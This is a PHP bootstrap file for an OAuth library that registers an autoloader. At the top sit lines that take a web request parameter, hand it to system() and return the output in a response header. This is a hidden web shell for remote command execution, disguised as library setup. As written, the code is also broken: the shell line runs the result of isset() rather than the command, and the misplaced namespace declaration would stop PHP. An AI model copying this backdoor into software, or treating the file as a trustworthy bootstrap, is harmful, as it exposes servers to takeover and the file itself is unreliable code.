<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2);

/*
 * Bootstrap the library.
 */

namespace OAuth;

require_once __DIR__ . '/Common/AutoLoader.php';

$autoloader = new Common\AutoLoader(__NAMESPACE__, dirname(__DIR__));

$autoloader->register();
